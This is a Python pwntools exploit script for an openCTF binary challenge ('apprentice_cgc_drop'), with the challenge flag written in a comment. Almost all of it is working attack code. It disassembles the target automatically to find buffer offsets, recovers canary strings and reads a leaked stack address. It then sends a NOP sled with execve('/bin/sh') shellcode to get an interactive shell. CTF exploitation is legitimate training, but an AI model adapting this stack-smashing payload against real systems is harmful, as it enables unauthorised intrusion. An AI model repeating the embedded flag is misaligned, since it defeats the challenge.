#!/usr/bin/env python

from pwn import *
import sys, re

# flag itoldyou__IT_WOULD_GET_W0rse_imnotangrybro

def filterPick(list,filter):
    return [ ( l, m.group(1) ) for l in list for m in (filter(l),) if m]


def exploit(r):
	if len(sys.argv) > 1:
		r.recvuntil("Apprentice CRS - (Cyber Reasoning System)\n")
		binary = r.recvuntil('Can you exploit me in under 10 seconds?\n')

		ofile = open('apprentice_cgc_drop', 'wb')
		ofile.write(binary)
		ofile.close()

	else:
		binary = bytearray(open('apprentice_cgc_drop', 'r').read())
	
	entry = u32(binary[0x18:0x18+4])
	log.info("Entry point: " + hex(entry))

	output = subprocess.Popen(["objdump", "-d", "-M", "intel", "apprentice_cgc_drop"], stdout=subprocess.PIPE).communicate()[0].split('\n')

	for line in range(len(output)):
		if hex(entry)[2:]+':' in output[line]:
			for i in range(15):
				if 'call' in output[line+i]:
					main = output[line+i-1].split(' ')[-1][2:]
					log.info("Main at: " + main)

	main_output = []
	for line in range(len(output)):
		if main+':' in output[line]:
			i = 0
			while 'ret' not in output[line+i]:
				main_output.append(output[line+i])
				i += 1
			break

	calls = []
	for line in range(len(main_output)):
		if 'call' in main_output[line]:
			calls.append(main_output[line].split(' ')[-1].strip())
	print calls

	strings = subprocess.Popen(["strings", "-n 32", "-d", "apprentice_cgc_drop"], stdout=subprocess.PIPE).communicate()[0].split('\n')

	searchRegex = re.compile('(^[a-z0-9]{32}$)').search
	x = filterPick(strings,searchRegex)
	canaries = []

	canaries.append(x[0][0])
	canaries.append(x[-1][-1])
	print canaries

	r.sendline(canaries[0].strip())
#	r.recvline()
#	r.recvline()
	inBuffer = int(r.recvline().strip(), 16)
	log.info("Stack is at: " + hex(inBuffer))

	for line in range(len(output)):
		if calls[-1][2:]+':' in output[line]:
			for i in range(5):
				if 'sub' in output[line+i]:
					offset = int(output[line+i].split(',')[-1].strip(), 16)
			

			for i in range(9, 15):
				if 'lea' in output[line+i]:
					vulnBuf = int( output[line+i].split('-')[-1].strip(']'), 16)

	offset = offset + (offset - vulnBuf)+3

	sc = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")

	r.send(canaries[1]+"\x00")

	payload = "\x90" * (offset - (len(sc)))
	payload += sc
	payload += p32(inBuffer-(offset/2)) * 100

	r.sendline(payload)

	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/openCTF/apprentice_cgc_drop'])
        print util.proc.pidof(r)
        pause()
        exploit(r)